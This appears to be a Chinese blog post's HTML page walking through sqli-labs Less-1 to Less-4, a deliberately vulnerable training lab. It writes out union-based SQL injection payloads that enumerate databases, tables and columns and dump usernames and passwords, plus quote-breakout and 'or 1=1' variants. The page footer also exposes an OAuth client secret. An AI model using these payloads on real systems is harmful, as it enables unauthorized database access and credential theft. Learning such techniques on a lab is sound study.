+<pre><code>  http://127.0.0.1/sqli-labs/Less-1/?id=-1’union select 1,2,3--+</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.ge16dj62niu_1534071408.png" alt></p>
+</li>
+<li><p><strong>当 id 的数据在数据库中不存在时</strong>，（此时我们可以 让<code>id=-1</code>, 也可以让<code>id=1 and 1=2</code>, 两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，就会将后面的语句的内容显示出来,否则会显示存在id的内容）此处前台页面返回了我们构造的 <code>union</code> 的数据。</p>
+</li>
+<li><p>下面顺便看看id存在时的情况,所以要记住,记得要将id设置成一个不存在的值</p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/20181127222530.png" alt></p>
+</li>
+<li><p>下面就真正查询数据库的各种信息了（可以看到<strong>只有第2列和第3列的结果显示在网页上</strong>），所以我们就<strong>只能用<code>2和3</code>这两个位置了</strong>，但是两个位置应该是不够用的，这时我们就用到数据库的<code>连接函数</code>了，常用的就<code>concat</code>和<code>concat_ws</code>,其中<code>concat_ws</code>的第一个参数是连接字符串的<code>分隔符</code>，还会用到<code>group_concat</code>(可以把查询出来的多行连接起来)</p>
+</li>
+<li><p>简单复习怎么使用</p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.n5l038hrrms_1534071415.png" alt></p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.wox6raufzu_1534071426.png" alt></p>
+<blockquote>
+<p>再次强调<code>concat_ws</code>的一个参数是连接字符串的分隔符，这里很明显可以看到，但一般第一个参数一般都不是这样传过去的，因为会被html编码，要使用mysql的<code>char函数</code>将<strong>十进制</strong>ASCII码转化成字符，如下面的（<code>：</code>的十进制ASCII是<code>58</code>），当然这里的分隔符也可以多个字符</p>
+</blockquote>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.ifxxgq4eoi_1534071435.png" alt></p>
+<p>  用的较多的就是这个啦，以后直接复制（<code>32</code>是<code>空格</code>的<code>十进制ASCII</code>）</p>
+<pre><code>  concat_ws(char(32,58,32),user(),database(),version())  
+
+  * user():返回当前数据库连接使用的用户
+  * database():返回当前数据库连接使用的数据库
+  * version():返回当前数据库的版本</code></pre></li>
+<li><p><strong>爆数据库</strong></p>
+<pre><code>  http://localhost/sqli-labs/Less-1/?id=-1&#39;union select 1,group_concat(schema_name),3 from information_schema.schemata--+</code></pre><p>  此时的 sql 语句为 <code>SELECT * FROM users WHERE id=’-1’union select 1,group_concat(schema
+  _name),3 from information_schema.schemata--+ LIMIT 0,1</code></p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.z30b5fzkoib_1534071444.png" alt></p>
+</li>
+<li><p>暴<code>security</code>数据库的数据表</p>
+<pre><code>  http://localhost/sqli-labs/Less-1/?id=-1&#39;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39;--+</code></pre><p>  此时的 sql 语句为 <code>SELECT * FROM users WHERE id=’-1’union select 1,group_concat(table_n
+  ame),3 from information_schema.tables where table_schema=’security’--+ LIMIT 0,1</code></p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.92t4b6c0djb_1534071453.png" alt></p>
+</li>
+<li><p>爆 users 表的列</p>
+<pre><code>  http://localhost/sqli-labs/Less-1/?id=-1&#39;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39;--+</code></pre><p>  此时的 sql 语句为 <code>SELECT * FROM users WHERE id=’-1’union select 1,group_concat(column
+  _name),3 from information_schema.columns where table_name=’users’--+ LIMIT 0,1</code></p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.uxni56mjox_1534071459.png" alt></p>
+</li>
+<li><p>爆数据</p>
+<blockquote>
+<p>最后那个id=2可以改成3,4,5… …</p>
+</blockquote>
+<pre><code>  http://localhost/sqli-labs/Less-1/?id=-1&#39;union select 1,username,password from users where id=2--+</code></pre><p>  此时的 sql 语句为 <code>SELECT * FROM users WHERE id=’-1’union select 1,username,password f
+  rom users where id=2--+ LIMIT 0,1</code></p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.dxjasy45coi_1534071465.png" alt></p>
+<blockquote>
+<p>Less1-less4 都可以利用上述 <code>union 操作</code>进行注入。下面就不进行赘述了。</p>
+</blockquote>
+</li>
+</ul>
+<h3 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h3><ul>
+<li><p>将<code>&#39;</code>（单引号）添加到数字中。</p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.siv9brk0hg_1534071471.png" alt></p>
+</li>
+<li><p>我们又得到了一个 Mysql 返回的错误，提示我们语法错误。</p>
+</li>
+<li><p>现在执行的查询语句如下:</p>
+<pre><code>  SELECT * FROM users WHERE id=1&#39; LIMIT 0,1</code></pre><p>  所以这里的<strong>奇数个单引号</strong>破坏了查询，导致抛出错误。因此我们得出的结果是，<strong>查询代码使用了整数。</strong></p>
+<pre><code>  Select * from TABLE where id = (some integer value);</code></pre></li>
+<li><p>现在，从开发者的视角来看，为了对这样的错误采取保护措施，我们可以<strong>注释掉剩余的查询,看是否正确响应</strong></p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.buo6091mrs_1534071478.png" alt></p>
+</li>
+<li><p>因此，源代码中可以分析到 SQL 语句为下：</p>
+<pre><code>  $sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code></pre></li>
+<li><p>可以成功注入的有：</p>
+<pre><code>  or 1=1
+  or 1=1 --+</code></pre></li>
+<li><p>其余的 payload 与 less1 中一样，只需要将 less1 中的<code>‘</code> 去掉即可。</p>
+</li>
+</ul>
+<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><ul>
+<li><p>首先加个单引号</p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.t2zwn6n8u9_1534071484.png" alt></p>
+</li>
+<li><p>可以看到报错那里出来了一个），原来这就是单引号注入的变形，那么我们在没有最终的sql语句的情况下怎么判断呢</p>
+<p>  首先看到near和at之间的字符串<img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.dx803xz4yl_1534071497.png" alt>，直接将左右的单引号去掉，那么就得到<code>&#39;1&#39;&#39;) LIMIT 0,1</code></p>
+<p>  我们明显看到<code>1</code>的右边多了一个<code>&#39;</code>这是似成相识的感觉吧，后面还有个<code>)</code>，那么对应于左边也应该有<code>(</code>，这里它意味着，开发者使用的查询是</p>
+<pre><code>  SELECT * FROM users WHERE id=(&#39;our input here&#39;) LIMIT 0,1</code></pre></li>
+<li><p>所以我们再用这样的代码来进行注入：</p>
+<pre><code>  ?id=1&#39;)--+</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/0.4mpstb7m95g_1534071508.png" alt></p>
+<p>  这样一来，我们便可以正常显示用户名和密码了，同时后面查询也已经被注释掉了。</p>
+</li>
+<li><p>在源代码中的 SQL 查询语句</p>
+<pre><code>  $sql=&quot;SELECT * FROM users WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code></pre></li>
+<li><p>可以成功注入的有：</p>
+<pre><code>  &#39;) or &#39;1&#39;=(&#39;1    这里的意思是,不使用注释符号
+  &#39;) or 1=1--+     这里使用了注释符号</code></pre></li>
+<li><p>其余的paylodad和less-1中的一样,只需要将less-1中的<code>&#39;</code>更换为<code>&#39;)</code>即可</p>
+</li>
+</ul>
+<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><ul>
+<li><p>我们使用<code>?id=1&quot;</code>,如下图</p>
+<p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/%E6%88%AA%E5%9B%BE_1538842923" alt></p>
+</li>
+<li><p>注入代码后，我们得到像这样的一个错误</p>
+<pre><code>  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&quot;1&quot;&quot;) LIMIT 0,1&#39; at line 1</code></pre></li>
+<li><p>这里它意味着，代码当中对 id 参数进行了<code>&quot;&quot;</code> 和 <code>()</code> 的包装。 所以我们再用这样的代码来进行注入:</p>
+<pre><code>  ?id=1&quot;)--+</code></pre><p>  <img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/%E6%88%AA%E5%9B%BE_1538843121" alt></p>
+</li>
+</ul>
+<ul>
+<li><p>这样一来，我们便可以得到用户名和密码了，同时后面查询也已经被注释掉了。 在源代码中的 SQL 查询语句，31 行</p>
+<pre class=" language-SQL"><code class="language-SQL">  $sql="SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1";</code></pre>
+</li>
+<li><p>可以成功注入的有:</p>
+<pre><code>  &quot;) or &quot;1&quot;=(&quot;1
+  &quot;) or 1=1--+</code></pre></li>
+<li><p>其余的 payload 与 less1 中一样，只需要将 less1 中的<code>&#39;</code>更换为<code>&quot;)</code></p>
+</li>
+</ul>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.fengwenhua.top" rel="external nofollow noreferrer">冯文华</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://www.fengwenhua.top/2019/05/23/sqli-lab-zhi-di-yi-zhang-ji-chu-zhi-shi/">https://www.fengwenhua.top/2019/05/23/sqli-lab-zhi-di-yi-zhang-ji-chu-zhi-shi/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="https://www.fengwenhua.top" target="_blank">冯文华</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/sqli-lab环境搭建/">
+                                    <span class="chip bg-color">sqli-lab环境搭建</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechatpay.jpg" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+            
+        </div>
+    </div>
+
+    
+
+    
+        <link rel="stylesheet" href="/libs/gitment/gitment-default.css">
+<link rel="stylesheet" href="/css/gitment.css">
+
+<div class="gitment-card card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="gitment-content" class="card-content"></div>
+</div>
+
+<script src="/libs/gitment/gitment.js"></script>
+<script>
+var gitment = new Gitment({
+    id: 'Wed May 22 2019 22:15:04 GMT+0000',
+    owner: 'fengwenhua',
+    repo: 'fengwenhua.github.io',
+    oauth: {
+        client_id: '487b675438c149b5818b',
+        client_secret: '501477eec1e2ed9f27751d02281b5834021d6c7b'
+    }
+});
+
+gitment.render('gitment-content');
+</script>
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2019/05/23/sqli-lab-zhi-di-yi-zhang-ji-chu-zhi-shi/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="sqli-lab之第一章 基础知识">
+                        
+                        <span class="card-title">sqli-lab之第一章 基础知识</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            声明本文内容参考了lcamry的mysql注入天书: http://www.cnblogs.com/lcamry/category/846064.html
+
+在我们的应用系统使用 sql 语句进行管理应用数据库时，往往采用拼接的方式形成一条
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-05-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/渗透测试/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            <a href="/categories/渗透测试/sqli-lab/" class="post-category">
+                                    sqli-lab
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sqli-lab环境搭建/">
+                        <span class="chip bg-color">sqli-lab环境搭建</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/05/23/sqli-lab-zhi-di-ling-zhang-huan-jing-da-jian/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="sqli-lab之第零章 环境搭建">
+                        
+                        <span class="card-title">sqli-lab之第零章 环境搭建</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前言本系列教程的试验靶场为sqli-labs ,该靶场的下载地址为 https://github.com/Audi-1/sqli-labs ,可以自行去下载,而装了git的童鞋也可以直接用下面的命令clone到随意的目录
+git clone
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-05-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/渗透测试/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
+                            <a href="/categories/渗透测试/sqli-lab/" class="post-category">
+                                    sqli-lab
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/sqli-lab环境搭建/">
+                        <span class="chip bg-color">sqli-lab环境搭建</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+<script src="https://cdn.bootcss.com/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+        tex2jax: {inlineMath: [['$', '$'], ['\(', '\)']]}
+    });
+</script>
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2018</span>
+            <a href="https://www.fengwenhua.top" target="_blank">冯文华</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">141.3k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/fengwenhua" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:807296772@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=807296772" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 807296772" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-140817753-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag() {
+        dataLayer.push(arguments);
+    }
+
+    gtag('js', new Date());
+    gtag('config', 'UA-140817753-1');
+</script>
+
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
